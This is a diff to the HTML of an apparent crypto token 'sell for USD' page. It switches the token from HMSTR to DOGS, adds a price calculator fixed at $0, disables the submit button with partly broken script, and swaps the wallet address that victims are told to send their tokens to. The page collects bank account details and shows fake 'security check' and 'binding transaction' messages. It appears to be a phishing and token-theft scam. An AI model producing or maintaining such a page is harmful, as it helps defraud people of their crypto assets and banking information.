@@ -22,6 +22,7 @@
         <img class="img" id="one" style="border-radius: 50%; border: 2px solid white;" src="images/dogs2.webp" height="125" width="130" alt="">
 
     </div>
+           <p style="color: yellow; font-size: 0.8rem; text-align: center; margin: 15px; font-weight: bold; padding: 7px; border: 2px solid yellow;">TOKEN SOLD SHOULD BE WORTH AT LEAST ($5)</p>
     <div style="display: none;" class="now">
         <div id="spin"></div>
     </div>
@@ -29,8 +30,47 @@
 
 
      <div class="form-container">
-        <h2 style="color: #00ffff;">Sell DOGS Tokens / <span style="color: #ff1f00; font-family: monospace;"> coming soon</span></h2>
-        <form style="display: none;">
+        <h2 style="color: #00ffff;">DOGS Tokens / <span style="color: #9aff40; font-family: monospace;">Listen Price soon</span></h2>
+
+          <div class="org">
+            <div>
+                <p style="margin-bottom: 5px;">Selling</p>
+                <div class="arr">
+                  <img class="img" style="border-radius: 50%; margin-top : -5px; border: 2px solid white;" src="images/dogs2.webp" height="35" width="35" alt="">
+                  <p>DOGS</p>
+                  </div>
+            </div>
+            <div>
+                <p>Amount</p>
+                <input type="number" id="amount" style="width: 90px; height: 10px; font-size: 1rem; font-family: monospace;" placeholder="0.00"/>
+
+            </div>
+        </div>
+           <img class="img" id="one" style="border-radius: 50%; margin-top : -5px; border: 2px solid white;" src="images/up.png" height="25" width="25" alt="">
+        <div class="org">
+            <div>
+                <p style="margin-bottom: 5px;">Receiving</p>
+                <div class="arr">
+                  <img class="img"  style="border-radius: 50%; margin-top: -5px; border: 2px solid white;" src="images/usd.png" height="35" width="35" alt="">
+                  <p>USD</p>
+                  </div>
+            </div>
+            <div>
+                <p>To Receive</p>
+                <p id="rewardx" style="font-weight: bold;">$0</p>
+
+            </div>
+        </div>
+
+    <script>
+        let amountx = document.getElementById("amount")
+        let rewardx = document.getElementById("rewardx")
+        amountx.addEventListener("input",() => {
+            rewardNow = amountx.value * 0.00
+            rewardx.innerText = (`$${rewardNow.toFixed(2)}`)
+        })
+    </script>
+        <form>
             <label for="country">Country:</label>
             <input type="text" id="name" name="name" required>
 
@@ -42,8 +82,6 @@
             <label for="account">Account Number/Bank ID:</label>
             <input type="text" id="account" name="account" required>
 
-            <label for="amount">HMSTR Token Amount:</label>
-            <input type="number" id="amount" name="amount" step="0.01" required>
 
             <input id="submit" type="submit" value="proceed">
         </form>
@@ -53,6 +91,14 @@
 
         </div>
     </div>
+
+  <script>
+   const buttonNow = document.getElementById("submit")
+   buttonNow.style.pointerEvents = "none"
+   buttonNow.style.backgroundColor = "gray"
+   button.style.color = "black"
+
+  </script>
     <h2 id="processing" style="color: #2beaff; text-align: center; font-family: monospace; display: none;">BINDING TRANSACTION TO OUR WALLET ADDRESS...</h2>
      <h2 id="running" style="color: #2beaff; text-align: center; font-family: monospace; display: none;">RUNNING SECURITY CHECKS...</h2>
       <h2 id="generating" style="color: #2beaff; text-align: center; font-family: monospace; display: none;">GENERATING UNIQUE EXCHANGE WALLET ADDRESS...</h2>
@@ -61,10 +107,11 @@
 
        <h2 style="color: #70ff15; text-align: center; font-family: monospace;">WALLET ACTIVE</h2>
 
-        <p style="color: #00ffea; font-size: 0.8rem; font-family: monospace; font-weight: bold; padding: 5px; text-align: center;">0x7807e37da345fcc86d4ac46fb483330d5eafc9a2</p>
+        <p style="color: #00ffea; font-size: 0.8rem; font-family: monospace; font-weight: bold; padding: 5px; text-align: center;">0xcf072A9eD81C83a01bda98A62031794770cD8C83</p>
 
-         <i style="color: gray; margin-top: 20px; font-size: 30px; margin-bottom: 15px;" id="icon" class="fa-solid fa-arrow-up-from-bracket"></i>
-        <p style="text-align: center;">The above wallet will be used to receive your HMSTR Tokens. To complete the transaction, follow the steps:</p>
+          <div class="spinal"></div>
+        <p style="color: orange; font-weight: bold; font-size: 0.6rem; padding: 5px; border: 2px solid orange;">Awaiting Wallet Confirmation</p>
+        <p style="font-weight: bold;">The above wallet will be used to receive your DOGS Tokens. To complete the transaction, follow the steps:</p>
         <ul>
             <li>Copy the wallet address above.</li>
             <li>Open your wallet where your Token is stored.</li>
